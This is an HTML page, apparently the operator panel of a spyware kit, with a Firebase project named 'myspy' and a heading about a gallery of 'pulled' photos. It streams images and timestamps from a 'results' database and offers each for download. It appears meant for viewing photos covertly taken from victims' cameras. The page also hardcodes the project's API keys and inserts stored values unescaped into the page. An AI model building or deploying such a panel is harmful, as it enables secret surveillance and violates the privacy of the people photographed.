<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>استوديو آلَﻤــشّـآ كَسًـ آلَۼد 📸</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: white; font-family: sans-serif; text-align: center; direction: rtl; }
        .gallery { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; padding: 20px; }
        .photo-card { 
            border: 2px solid #ff0000; 
            padding: 10px; 
            border-radius: 15px; 
            background: #111; 
            box-shadow: 0 0 15px rgba(255,0,0,0.2);
        }
        img { width: 280px; border-radius: 10px; display: block; margin-bottom: 10px; cursor: pointer; }
        .download-btn {
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin-top: 5px;
        }
        .download-btn:hover { background: #cc0000; }
        p { font-size: 12px; color: #888; margin: 5px 0; }
    </style>
</head>
<body>
    <h1 style="color: #ff0000; text-shadow: 0 0 10px red;">📸 معرض الصور المسحوبة</h1>
    <p>بإشراف: آلَﻤــشّـآ كَسًـ آلَۼد</p>
    <div class="gallery" id="gallery"></div>

    <script>
        const firebaseConfig = {
          apiKey: "AIzaSyAvb-rjNbcWHlZEdEF0q9v3PL8XF8jnt3U",
          authDomain: "myspy-2579b.firebaseapp.com",
          projectId: "myspy-2579b",
          storageBucket: "myspy-2579b.firebasestorage.app",
          messagingSenderId: "487846863334",
          appId: "1:487846863334:web:b58620e6f34d187e02b627"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        db.ref('results').on('child_added', (snap) => {
            const data = snap.val();
            const div = document.createElement('div');
            div.className = 'photo-card';
            
            // إنشاء اسم للملف عند التحميل (بالتاريخ)
            const fileName = `image_${data.date.replace(/[/, :]/g, '_')}.jpg`;

            div.innerHTML = `
                <a href="${data.photo}" target="_blank">
                    <img src="${data.photo}" title="اضغط لفتح الصورة في صفحة مستقلة">
                </a>
                <p>${data.date}</p>
                <a href="${data.photo}" download="${fileName}" class="download-btn">حفظ في الجهاز 📥</a>
            `;
            document.getElementById('gallery').prepend(div);
        });
    </script>
</body>
</html>
